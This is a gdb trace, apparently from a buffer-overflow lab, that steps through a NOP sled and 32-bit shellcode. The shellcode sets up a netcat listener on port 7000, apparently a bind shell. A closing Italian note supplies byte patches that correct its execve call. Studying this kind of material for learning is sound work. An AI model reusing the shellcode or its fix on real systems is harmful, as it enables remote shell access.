BFFFF138: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF148: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF158: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF168: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF178: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF188: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF198: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF1A8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF1B8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF1C8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF1D8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF1E8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF1F8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF208: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF218: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF228: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF238: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF248: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF258: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF268: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF278: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF288: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF298: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF2A8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF2B8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF2C8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF2D8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF2E8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF2F8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF308: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF318: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF328: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF338: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF348: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF358: 90 90 90 90 90 90 90 90 - 90 E8 00 00 00 00 5D 8D ??????????]?
BFFFF368: 9D 1E FC FF FF 8D 8D 3F - FC FF FF 8D 85 1E FC FF ??????????????
BFFFF378: FF 89 85 3F FC FF FF 8D - 85 26 FC FF FF 89 85 43 ?????????&?????C
BFFFF388: FC FF FF 8D 85 29 FC FF - FF 89 85 47 FC FF FF 8D ?????)?????G????
BFFFF398: 85 2C FC FF FF 89 85 4B - FC FF FF 8D 85 31 FC FF ?,?????K?????1??
BFFFF3A8: FF 89 85 4F FC FF FF 8D - 85 34 FC FF FF 89 85 53 ???O?????4?????S
BFFFF3B8: FC FF FF FE 8D 3B FC FF - FF 8D 95 57 FC FF FF 31 ?????;?????W???1
BFFFF3C8: C0 C7 05 00 00 00 00 6F - 00 00 00 83 2D 00 00 00 ??o?-
BFFFF3D8: 00 64 CD 80 0A 3A 2F 62 - 69 6E 3A 2F 75 73 72 2F d
:/bin:/usr/
BBBBBBBBBBBBBBBB

Breakpoint 2, f () at target.c:33
33      }
(gdb) x /20wx 0xBFFFEF48
0xbfffef48:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffef58:     0x00000495      0x00000010      0xbffff000      0xbffff000
0xbfffef68:     0xbffff000      0xbffff000      0xbffff000      0xbffff000
0xbfffef78:     0xbffff000      0xbffff000      0xbffff000      0x6e69622f
0xbfffef88:     0x00636e2f      0x2d006c2d      0x30370070      0x2d003030
(gdb) display/i $pc
1: x/i $pc
=> 0x40158e <f+965>:    nop
(gdb) stepi
0x0040158f      33      }
1: x/i $pc
=> 0x40158f <f+966>:    lea    -0xc(%ebp),%esp
(gdb) info registers
eax            0xa                 10
ecx            0x0                 0
edx            0xb7fa59b8          -1208329800
ebx            0x403ff4            4210676
esp            0xbfffeec0          0xbfffeec0
ebp            0xbfffef78          0xbfffef78
esi            0x64                100
edi            0xcd                205
eip            0x40158f            0x40158f <f+966>
eflags         0x286               [ PF SF IF ]
cs             0x73                115
ss             0x7b                123
ds             0x7b                123
es             0x7b                123
fs             0x0                 0
gs             0x33                51
(gdb) stepi
0x00401592      33      }
1: x/i $pc
=> 0x401592 <f+969>:    pop    %ebx
(gdb) info registers
eax            0xa                 10
ecx            0x0                 0
edx            0xb7fa59b8          -1208329800
ebx            0x403ff4            4210676
esp            0xbfffef6c          0xbfffef6c
ebp            0xbfffef78          0xbfffef78
esi            0x64                100
edi            0xcd                205
eip            0x401592            0x401592 <f+969>
eflags         0x286               [ PF SF IF ]
cs             0x73                115
ss             0x7b                123
ds             0x7b                123
es             0x7b                123
fs             0x0                 0
gs             0x33                51
(gdb) stepi
0x00401593      33      }
1: x/i $pc
=> 0x401593 <f+970>:    pop    %esi
(gdb) stepi
0x00401594      33      }
1: x/i $pc
=> 0x401594 <f+971>:    pop    %edi
(gdb) stepi
0x00401595      33      }
1: x/i $pc
=> 0x401595 <f+972>:    pop    %ebp
(gdb) stepi
0x00401596      33      }
1: x/i $pc
=> 0x401596 <f+973>:    ret
(gdb) info registers
eax            0xa                 10
ecx            0x0                 0
edx            0xb7fa59b8          -1208329800
ebx            0xbffff000          -1073745920
esp            0xbfffef7c          0xbfffef7c
ebp            0xbffff000          0xbffff000
esi            0xbffff000          -1073745920
edi            0xbffff000          -1073745920
eip            0x401596            0x401596 <f+973>
eflags         0x286               [ PF SF IF ]
cs             0x73                115
ss             0x7b                123
ds             0x7b                123
es             0x7b                123
fs             0x0                 0
gs             0x33                51
(gdb) stepi
0xbffff000 in ?? ()
1: x/i $pc
=> 0xbffff000:  nop
(gdb) stepi
0xbffff001 in ?? ()
1: x/i $pc
=> 0xbffff001:  nop
(gdb) b *0xbffff360
Breakpoint 3 at 0xbffff360
(gdb) x /10bx 0xBFFFf360
0xbffff360:     0x90    0xe8    0x00    0x00    0x00    0x00    0x5d    0x8d
0xbffff368:     0x9d    0x1e
(gdb) c
Continuing.

Breakpoint 3, 0xbffff360 in ?? ()
1: x/i $pc
=> 0xbffff360:  nop
(gdb) stepi
0xbffff361 in ?? ()
1: x/i $pc
=> 0xbffff361:  call   0xbffff366
(gdb) disassemble $eip
No function contains specified address.
(gdb) disassemble 0xbffff361
No function contains specified address.
(gdb) stepi
0xbffff366 in ?? ()
1: x/i $pc
=> 0xbffff366:  pop    %ebp
(gdb) info registers
eax            0xa                 10
ecx            0x0                 0
edx            0xb7fa59b8          -1208329800
ebx            0xbffff000          -1073745920
esp            0xbfffef7c          0xbfffef7c
ebp            0xbffff000          0xbffff000
esi            0xbffff000          -1073745920
edi            0xbffff000          -1073745920
eip            0xbffff366          0xbffff366
eflags         0x286               [ PF SF IF ]
cs             0x73                115
ss             0x7b                123
ds             0x7b                123
es             0x7b                123
fs             0x0                 0
gs             0x33                51
(gdb) stepi
0xbffff367 in ?? ()
1: x/i $pc
=> 0xbffff367:  lea    -0x3e2(%ebp),%ebx
(gdb) info registers $ebp
ebp            0xbffff366          0xbffff366
(gdb) stepi
0xbffff36d in ?? ()                                                                                               
1: x/i $pc                                                                                                        
=> 0xbffff36d:  lea    -0x3c1(%ebp),%ecx                                                                          
(gdb) stepi
0xbffff373 in ?? ()
1: x/i $pc
=> 0xbffff373:  lea    -0x3e2(%ebp),%eax
(gdb) stepi
0xbffff379 in ?? ()
1: x/i $pc
=> 0xbffff379:  mov    %eax,-0x3c1(%ebp)
(gdb) infor registers
Undefined command: "infor".  Try "help".
(gdb) info registers
eax            0xbfffef84          -1073746044
ecx            0xbfffefa5          -1073746011
edx            0xb7fa59b8          -1208329800
ebx            0xbfffef84          -1073746044
esp            0xbfffef80          0xbfffef80
ebp            0xbffff366          0xbffff366
esi            0xbffff000          -1073745920
edi            0xbffff000          -1073745920
eip            0xbffff379          0xbffff379
eflags         0x286               [ PF SF IF ]
cs             0x73                115
ss             0x7b                123
ds             0x7b                123
es             0x7b                123
fs             0x0                 0
gs             0x33                51
(gdb) 
eax            0xbfffef84          -1073746044
ecx            0xbfffefa5          -1073746011
edx            0xb7fa59b8          -1208329800
ebx            0xbfffef84          -1073746044
esp            0xbfffef80          0xbfffef80
ebp            0xbffff366          0xbffff366
esi            0xbffff000          -1073745920
edi            0xbffff000          -1073745920
eip            0xbffff379          0xbffff379
eflags         0x286               [ PF SF IF ]
cs             0x73                115
ss             0x7b                123
ds             0x7b                123
es             0x7b                123
fs             0x0                 0
gs             0x33                51
(gdb) x /32wx 0xBFFFefa5
0xbfffefa5:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffefb5:     0x00000000      0x00000000      0x00000000      0x73706f6e
0xbfffefc5:     0x9090903e      0x90909090      0x90909090      0x90909090
0xbfffefd5:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffefe5:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffeff5:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff005:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff015:     0x90909090      0x90909090      0x90909090      0x90909090
(gdb) x /8wx 0xBFFFefa5
0xbfffefa5:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffefb5:     0x00000000      0x00000000      0x00000000      0x73706f6e
(gdb) stepi
0xbffff37f in ?? ()
1: x/i $pc
=> 0xbffff37f:  lea    -0x3da(%ebp),%eax
(gdb) x /8wx 0xBFFFefa5
0xbfffefa5:     0xbfffef84      0x00000000      0x00000000      0x00000000
0xbfffefb5:     0x00000000      0x00000000      0x00000000      0x73706f6e
(gdb) stepi
0xbffff385 in ?? ()
1: x/i $pc
=> 0xbffff385:  mov    %eax,-0x3bd(%ebp)
(gdb) x /8wx 0xBFFFefa5
0xbfffefa5:     0xbfffef84      0x00000000      0x00000000      0x00000000
0xbfffefb5:     0x00000000      0x00000000      0x00000000      0x73706f6e
(gdb) stepi
0xbffff38b in ?? ()
1: x/i $pc
=> 0xbffff38b:  lea    -0x3d7(%ebp),%eax
(gdb) x /8wx 0xBFFFefa5
0xbfffefa5:     0xbfffef84      0xbfffef8c      0x00000000      0x00000000
0xbfffefb5:     0x00000000      0x00000000      0x00000000      0x73706f6e
(gdb) stepi
0xbffff391 in ?? ()
1: x/i $pc
=> 0xbffff391:  mov    %eax,-0x3b9(%ebp)
(gdb) stepi
0xbffff397 in ?? ()
1: x/i $pc
=> 0xbffff397:  lea    -0x3d4(%ebp),%eax
(gdb) stepi
0xbffff39d in ?? ()
1: x/i $pc
=> 0xbffff39d:  mov    %eax,-0x3b5(%ebp)
(gdb) stepi
0xbffff3a3 in ?? ()
1: x/i $pc
=> 0xbffff3a3:  lea    -0x3cf(%ebp),%eax
(gdb) x /8wx 0xBFFFefa5
0xbfffefa5:     0xbfffef84      0xbfffef8c      0xbfffef8f      0xbfffef92
0xbfffefb5:     0x00000000      0x00000000      0x00000000      0x73706f6e
(gdb) stepi
0xbffff3a9 in ?? ()
1: x/i $pc
=> 0xbffff3a9:  mov    %eax,-0x3b1(%ebp)
(gdb) stepi
0xbffff3af in ?? ()
1: x/i $pc
=> 0xbffff3af:  lea    -0x3cc(%ebp),%eax
(gdb) x /8wx 0xBFFFefa5
0xbfffefa5:     0xbfffef84      0xbfffef8c      0xbfffef8f      0xbfffef92
0xbfffefb5:     0xbfffef97      0x00000000      0x00000000      0x73706f6e
(gdb) stepi
0xbffff3b5 in ?? ()
1: x/i $pc
=> 0xbffff3b5:  mov    %eax,-0x3ad(%ebp)
(gdb) stepi
0xbffff3bb in ?? ()
1: x/i $pc
=> 0xbffff3bb:  decb   -0x3c5(%ebp)
(gdb) stepi
0xbffff3c1 in ?? ()
1: x/i $pc
=> 0xbffff3c1:  lea    -0x3a9(%ebp),%edx
(gdb) x /8wx 0xBFFFefa5
0xbfffefa5:     0xbfffef84      0xbfffef8c      0xbfffef8f      0xbfffef92
0xbfffefb5:     0xbfffef97      0xbfffef9a      0x00000000      0x73706f6e
(gdb) stepi
0xbffff3c7 in ?? ()
1: x/i $pc
=> 0xbffff3c7:  xor    %eax,%eax
(gdb) stepi
0xbffff3c9 in ?? ()
1: x/i $pc
=> 0xbffff3c9:  movl   $0x6f,0x0
(gdb) stepi

Program received signal SIGSEGV, Segmentation fault.
0xbffff3c9 in ?? ()
1: x/i $pc
=> 0xbffff3c9:  movl   $0x6f,0x0
(gdb) 

-----

errore nel file .S, la parte finale andava codificata così, e avrebbe funzionato:

(gdb) set *((unsigned char*)0xbffff3c9) = 0xB0
(gdb) set *((unsigned char*)0xbffff3ca) = 0x6F
(gdb) set *((unsigned char*)0xbffff3cb) = 0x2C
(gdb) set *((unsigned char*)0xbffff3cc) = 0x64
(gdb) set *((unsigned char*)0xbffff3cd) = 0xCD
(gdb) set *((unsigned char*)0xbffff3ce) = 0x80
(gdb) x/3i 0x0xbffff3c9
   0x0xbffff3c9:    mov    $0x6f,%al
   0x0xbffff3cb:    sub    $0x64,%al
   0x0xbffff3cd:    int    $0x80
(gdb) 